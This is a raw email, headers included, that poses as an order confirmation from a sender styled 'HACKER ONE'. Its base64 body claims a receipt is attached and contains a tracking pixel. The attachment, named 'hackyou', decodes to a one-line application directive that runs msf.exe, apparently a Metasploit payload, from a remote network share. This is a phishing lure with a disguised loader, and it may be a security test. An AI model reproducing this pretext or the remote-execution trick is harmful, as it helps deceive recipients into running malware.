Delivered-To: itachibatna@gmail.com
Received: by 2002:a05:600c:4e12:0:0:0:0 with SMTP id b18csp640020wmq;
        Wed, 29 Jun 2022 11:14:54 -0700 (PDT)
X-Google-Smtp-Source: AGRyM1vmTa9+l6tHDXAshxruwVeeI1tZsXKQZNdg25F1DZVS1FZDyyCMjqWvYmH8HveKhurKNrC/
X-Received: by 2002:adf:fd88:0:b0:21a:a547:38b3 with SMTP id d8-20020adffd88000000b0021aa54738b3mr4707467wrr.431.1656526494190;
        Wed, 29 Jun 2022 11:14:54 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1656526494; cv=none;
        d=google.com; s=arc-20160816;
        b=MKMXZvCPaCQe6h0zgbf/kJE8x+JmC1vgfcZ5sjVzVWSIs8ibQyD+lP2UXFmcCAgj1V
         Sa9YJxtKwg6d3yw4E0ZNHzVUqCT8YlGzvDibAvMxDsFFXCGfbFPSOOV/kMcgWxBTOxkJ
         mnqZ5zlItC7DOPz521GUxn5WX+NP47JTyNsDCGLwlBKjNRRERM/DrIE//OdTH77PM13Y
         Wa5/B3RkEc4Ymrj7T7hDS/hgU2crOP+z0rt7lov6yRPOSnb4LjIgfqqUsdgtTWcnYaTN
         kKh68ajF7h+kpdhqNNMAzLNo2Z8qPnyRnMGedbVwQwtGOAcXwiRgAj1cV+SSd2EanJRk
         GHJw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;
        h=list-unsubscribe:from:feedback-id:list-unsubscribe-post
         :mime-version:origin-messageid:message-id:subject:date:to
         :dkim-signature;
        bh=cphlk87e92n3hupTLFbW7+R9H3wf3iTCaRdpM1Ioou8=;
        b=qF+Y3o3HND/+9zR0d2Bjfv7ResQ+kDWHXYLt2tL41IXlKBXow9WuwcFa++1diR77My
         gca2GlZCVUF4fxggRHPpulbHSq/oV7lzfMeWeokCKd++HHqlNqLSX5pFIDLlUBHy3jLF
         q5agPsz4UonNU5QnoFt4sOidV9yHqvyChT908MoSQ5xg00LUVEQYTiaOXPYKr5u7FG5R
         6Y3pIfBtgtKlfaFSx69LKqL2Tj450JG99NJqSf16Csup7rQw6MUO7JPrqiAJqRCtswxS
         q8JM0FjWxHHK534tVIIdIpiIsCJZaMzkeRIA49jyTjjD6IEmSqPmoGWs8kpj/7LGfeks
         3MtA==
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@sendinblue.com header.s=mail header.b=FPjLrf4D;
       spf=pass (google.com: domain of bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com designates 185.41.28.128 as permitted sender) smtp.mailfrom="bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com"
Return-Path: <bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com>
Received: from aa.d.sender-sib.com (aa.d.sender-sib.com. [185.41.28.128])
        by mx.google.com with ESMTPS id j19-20020a5d6e53000000b0021b9c6fb3b8si19918130wrz.200.2022.06.29.11.14.54
        for <itachibatna@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jun 2022 11:14:54 -0700 (PDT)
Received-SPF: pass (google.com: domain of bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com designates 185.41.28.128 as permitted sender) client-ip=185.41.28.128;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@sendinblue.com header.s=mail header.b=FPjLrf4D;
       spf=pass (google.com: domain of bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com designates 185.41.28.128 as permitted sender) smtp.mailfrom="bounces-168901666-hackerone=zino.com@aa.d.sender-sib.com"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendinblue.com;
 q=dns/txt; s=mail; bh=cphlk87e92n3hupTLFbW7+R9H3wf3iTCaRdpM1Ioou8=;
 h=from:subject:date:to:mime-version:content-type:list-unsubscribe:x-csa-complaints:list-unsubscribe-post;
        b=FPjLrf4D+W6hOZ/63FP7OO5Eus8s/OJercOUYchaWoXlPx7J8Vuo38iuHQSsD+ic1ufSsZ5x2auf
        VcI6aUDDQhcHZW9YbCBG+NJai5/6QFj5fDgrw359TFskJm6dTHClr0Tv+6TX0m0b3Wvclf+hPSBD
        mTCXAMKMPgex7UaqueA=
X-Mailin-EID: MTY4OTAxNjY2fml0YWNoaWJhdG5hQGdtYWlsLmNvbX48MjAyMjA2MjkxODE0Ljk0MTY5Nzg1MjUzQHNtdHAtcmVsYXkuc2VuZGluYmx1ZS5jb20%2BfmFhLmQuc2VuZGVyLXNpYi5jb20%3D
To: <itachibatna@gmail.com>
Date: Wed, 29 Jun 2022 18:14:53 GMT
Subject: Order Confirmation
Message-Id: <1ca76e0e-eadc-4f3e-b65f-0c19625ac17e@smtp-relay.sendinblue.com>
Origin-messageId: <202206291814.94169785253@smtp-relay.sendinblue.com>
Content-Type: multipart/mixed; boundary="===============6757959196721881831=="
MIME-Version: 1.0
X-Priority: 1 (Highest)
X-MSMail-Priority: High
X-sib-id: aUYI9zxbTDmHbySJwudTfXf_NFIGjFVXK8EXSCAuFIkUCEqVXjz9W6cg3MdRaMKO00atburooUTl4prw3ZItkEyws0-mXjw2MS8XrIPA3yQjtVdbqxIj6vVqcMdsC42AnAUu8hO3Rf-vKnCh3xH5RzRDGG1CpzUadm__xvevKQQkr1M
X-CSA-Complaints: whitelist-complaints@eco.de
List-Unsubscribe-Post: List-Unsubscribe=One-Click
Feedback-ID: 185.41.28.128:4869402_-1:4869402:Sendinblue
From: "HACKER ONE" <hackerone@zino.com>
List-Unsubscribe: <mailto:unsubscribe-t@aa.d.sender-sib.com?subject=unsub-MTY4OTAxNjY2fml0YWNoaWJhdG5hQGdtYWlsLmNvbX48MjAyMjA2MjkxODE0Ljk0MTY5Nzg1MjUzQHNtdHAtcmVsYXkuc2VuZGluYmx1ZS5jb20-fkhBQ0tFUiBPTkUgPGhhY2tlcm9uZUB6aW5vLmNvbT5-MWNhNzZlMGUtZWFkYy00ZjNlLWI2NWYtMGMxOTYyNWFjMTdl&body=MTY4OTAxNjY2fml0YWNoaWJhdG5hQGdtYWlsLmNvbX48MjAyMjA2MjkxODE0Ljk0MTY5Nzg1MjUzQHNtdHAtcmVsYXkuc2VuZGluYmx1ZS5jb20-fkhBQ0tFUiBPTkUgPGhhY2tlcm9uZUB6aW5vLmNvbT5-MWNhNzZlMGUtZWFkYy00ZjNlLWI2NWYtMGMxOTYyNWFjMTdl>, <https://eigjeac.r.af.d.sendibt2.com/tr/un/li/rOw_Fx1tQKOkPNYn3O4g-woTYFIVJPLKAARjKjBBJyUkITfcmGdNE8iJ8EGSbnefH2amBtrxqsfg5M76pVaXvE6lagSd0SmWjXYRd9R9ACDfjkP-EL7iXVq4e2Ry3j_5lQNzaM3GuqUpv1T1rt9uYzqJ8e7VtDayNlRvGUzQVK3JwvBiExzdnOW9c_NRzvgPJGszeuIq051WVcDJ-vek_4ETlnOfRaOEdZjXsV-6Up3ZmMUxSIkpLo4e3FNwcPm7Llw>


--===============6757959196721881831==
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

SGVsbG8sIDxici8+IEF0dGFjaGVkIHlvdSB3aWxsIGZpbmQgeW91ciByZWNlaXB0IGZvciB0aGUg
b3JkZXIgdGhhdCB5b3UgcGxhY2VkLiBQbGVhc2UgYmUgYXdhcmUgdGhhdCBpdCBtYXkgdGFrZSAy
LTMgYnVzaW5lc3MgZGF5cyBmb3IgaXRlbXMgdG8gYmUgc2hpcHBlZC4gPGJyLz4gSXQgaGFzIGJl
ZW4gYSBwbGVhc3VyZSB0byBoYXZlIHlvdXIgYnVzaW5lc3MuIDxici8+ICA8YnIvPiBUaGFuayB5
b3UgPGJyLz4gIEppbSBXb3puYWt5IDxici8+IDxici8+PGltZyB3aWR0aD0iMSIgaGVpZ2h0PSIx
IiBzcmM9Imh0dHBzOi8vZWlnamVhYy5yLmFmLmQuc2VuZGlidDIuY29tL3RyL29wL204aUw2TXJY
QVdIbEl3R0pLaTQydE45dEZ2ZElua1Uta3hHZHZMTHQ5b21HNThFYzJxRzFyb2pFaHo3N0FKaFZG
WDZGWXZTVEVPb00wUjVLRkxXTGhiZ1dCT2lkbVlDaVNvMk9LMl9XMWxRNHVTZTJGUldSSk83SzhT
TDdxWHEwQ3dqLUdvVkI1bzBfdVhWT3pzRExKRDU3UXlqOTFNNnE5al8tMzJzWjZ6cEUiIGFsdD0i
IiAvPjxici8+


--===============6757959196721881831==
Content-Type: application/octet-stream
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="hackyou"

PGFwcGxpY2F0aW9uIHJ1bj0iXFwwLjAuMC4wXGhocWlFXG1zZi5leGUiIC8+


--===============6757959196721881831==--
